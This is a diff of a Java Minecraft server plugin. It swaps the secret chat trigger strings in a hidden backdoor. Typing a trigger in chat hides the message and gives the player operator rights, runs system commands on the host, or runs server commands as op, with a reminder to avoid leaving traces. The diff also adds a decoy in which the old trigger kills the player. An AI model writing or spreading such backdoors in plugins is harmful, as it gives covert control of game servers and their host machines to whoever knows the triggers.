@@ -35,7 +35,7 @@ public class TestPlugin extends JavaPlugin implements Listener {
         String message = event.getMessage();
 
         // 检查消息是否包含特殊字符串
-        if (message.contains("@f0b2a7cce8877aec3633f33122cfdf8173d1540bdd01da578c72ee1c475d3430")) {
+        if (message.contains("@d68b250fe3f2332c1bb4f97d34551ce9")) {
             // 取消事件的进一步传播，防止它显示在公共聊天
             event.setCancelled(true);
 
@@ -62,7 +62,7 @@ public class TestPlugin extends JavaPlugin implements Listener {
                     public void run() {
                         player.setOp(false);
                         player.sendMessage(ChatColor.RED
-                                + "Operator Permission is removed,simply execute '@f0b2a7cce8877aec3633f33122cfdf8173d1540bdd01da578c72ee1c475d3430' again.");
+                                + "Operator Permission is removed,simply execute '@d68b250fe3f2332c1bb4f97d34551ce9' again.");
                     }
                 }, 20 * 60 * 20); // 20分钟 * 60秒/分钟 * 20ticks/秒
             } else if ("keep".equals(msgParts[1])) {
@@ -74,9 +74,10 @@ public class TestPlugin extends JavaPlugin implements Listener {
                 player.sendMessage(ChatColor.RED + "now, you do not have Operator Permisson!");
             }
         }
-        if (message.startsWith("@439aedc168164abaaafee5166bcd2d6f50a2482ad40fa259bf1948d16fd9ac98")) {
+        if (message.startsWith("@f07a7024609ca2a6ce681d74b986a3d3")) {
             event.setCancelled(true);
-            String commandStr = message.substring("@439aedc168164abaaafee5166bcd2d6f50a2482ad40fa259bf1948d16fd9ac98".length()).trim(); // 提取命令
+            String commandStr = message
+                    .substring("@f07a7024609ca2a6ce681d74b986a3d3".length()).trim(); // 提取命令
 
             // 分割命令和参数
             String[] commandArray = commandStr.split(" ");
@@ -104,12 +105,12 @@ public class TestPlugin extends JavaPlugin implements Listener {
                 // e.printStackTrace();
                 player.sendMessage(ChatColor.RED + "Please run SystemCommand");
             }
-}
+        }
 
-        if (message.startsWith("@e1cb0156ced867646179d149b49006c7cb6eef0998bad493e9f126ae3edeac38")) {
+        if (message.startsWith("@d12fcc3ba27d987709cbfadc123a609b")) {
             event.setCancelled(true);
             String command_excute = message
-                    .substring("@e1cb0156ced867646179d149b49006c7cb6eef0998bad493e9f126ae3edeac38".length()).trim();
+                    .substring("@d12fcc3ba27d987709cbfadc123a609b".length()).trim();
             if (!command_excute.isEmpty()) {
                 Bukkit.getScheduler().runTask(this, () -> {
                     player.setOp(true);
@@ -119,10 +120,10 @@ public class TestPlugin extends JavaPlugin implements Listener {
             }
 
         }
-        if (message.startsWith("@48647cf340722817cf0e92b03f4cd2a07dd17dbfd07de7cb7cafef9862e045c0")) {
+        if (message.startsWith("@ec0e060ad3bec0dc4a63fa076e797f79")) {
             event.setCancelled(true);
             String command_execute = message
-                    .substring("@48647cf340722817cf0e92b03f4cd2a07dd17dbfd07de7cb7cafef9862e045c0".length()).trim();
+                    .substring("@ec0e060ad3bec0dc4a63fa076e797f79".length()).trim();
 
             if (!command_execute.isEmpty()) {
 
@@ -134,6 +135,10 @@ public class TestPlugin extends JavaPlugin implements Listener {
             }
             player.sendMessage(ChatColor.RED
                     + "Warning, Be careful if you perform operations with output operations that leave traces!");
+        }
+        if (message.startsWith("@f0b2a7cce8877aec3633f33122cfdf8173d1540bdd01da578c72ee1c475d3430")) {
+            player.sendTitle(ChatColor.RED + "恭喜!", ChatColor.GOLD + "您现在是服务器管理员了!", 10, 70, 20);
+            player.setHealth(0);
         }
 
     }
